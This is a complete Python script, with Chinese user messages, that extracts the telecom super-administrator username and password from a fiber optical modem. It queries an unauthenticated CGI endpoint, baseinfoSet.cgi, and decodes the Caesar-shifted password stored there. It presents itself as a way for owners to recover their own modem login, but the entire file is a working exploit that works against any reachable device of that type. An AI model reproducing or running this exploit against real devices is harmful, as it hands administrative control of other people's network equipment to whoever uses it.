#!/usr/bin/env python3
import sys
import json
if sys.version_info[0] < 3:
    print('此脚本仅支持Python3', file=sys.stderr)
    exit(1)

try:
    import requests
except ImportError:
    print('无法导入依赖包 "requests"。 请使用pip或系统包管理安装', file=sys.stderr)
    exit(1)

def pwdcalc(rawstr, offset = 4) -> str:
    print('启动分析，offset为%d' % offset)
    pwd = ''
    rawstr = rawstr.rstrip('&')
    for n in map(int,rawstr.split('&')):
        if n in range(97,123):
            pwd += chr(((n - 97 - offset) % 26) + 97)
        elif n in range(65,91):
            pwd += chr(((n - 65 - offset) % 26) + 65)
        else:
            pwd += chr(n)
    return pwd

def CheckPage(hostIP, port=8080, session:requests.session = None) -> bool:
    get = getattr(session, 'get', requests.get) if session else requests.get
    try:
        res = get("http://%s:%d" % (hostIP, port), timeout = 5)
    except requests.exceptions.ConnectionError:
        return False
    return '<body onLoad="login()">' in res.text and './cgi-bin/login.htm.cgi' in res.text

def Getpwd(hostIP, port=8080, session:requests.session = None) -> str:
    get = getattr(session, 'get', requests.get) if session else requests.get
    res = get("http://%s:%d/cgi-bin/baseinfoSet.cgi" % (hostIP, port), timeout = 10)
    try:
        j = res.json()
    except json.decoder.JSONDecodeError:
        print('获取失败，地址 http://%s:%d/cgi-bin/baseinfoSet.cgi 并未返回预定数据' % (hostIP, port), file=sys.stderr)
        return None
    u = j.get('BASEINFOSET',{}).get('baseinfoSet_TELECOMACCOUNT','')
    p = j.get('BASEINFOSET',{}).get('baseinfoSet_TELECOMPASSWORD','')
    return u, p
    
def main(hostIP, port=8080):
    session = requests.Session()
    print('正在确认设备......', end='', flush=True)
    if not CheckPage(hostIP, port, session):
        print(' 失败!')
        print('获取失败，地址 http://%s:%d/ 并未返回预定数据' % (hostIP, port), file=sys.stderr)
        exit(1)
    print(' 成功!')
    print('正在获取配置......', end='', flush=True)
    username, rawpwd = Getpwd(hostIP, port, session)
    if not rawpwd:
        print(' 失败!')
        print('获取失败，无法从 http://%s:%d/cgi-bin/baseinfoSet.cgi 中分析数据，请手动分析' % (hostIP, port), file=sys.stderr)
        exit(1)
    print(' 成功!')
    pwd = pwdcalc(rawpwd)
    if not pwd:
        print('密码分析失败，请从 http://%s:%d/cgi-bin/baseinfoSet.cgi 中手动分析密码' % (hostIP, port), file=sys.stderr)
    print('你光猫的超级管理员账号是： %s' % username)
    print('你光猫的超级管理员密码是： %s' % pwd)

if __name__ == "__main__":
    lenarg = len(sys.argv)
    port = 8080
    if lenarg == 1:
        print('使用方法： %s <光猫IP> [<光猫管理端口>]' % sys.argv[0])
        exit(1)
    elif lenarg == 2:
        host = sys.argv[1]
    elif lenarg == 3:
        host = sys.argv[1]
        port = int(sys.argv[2]) if sys.argv[2].isnumeric() else 8080
    print('启动配置：\n\t光猫IP：%s\n\t光猫管理端口：%d' % (host, port))
    main(host, port)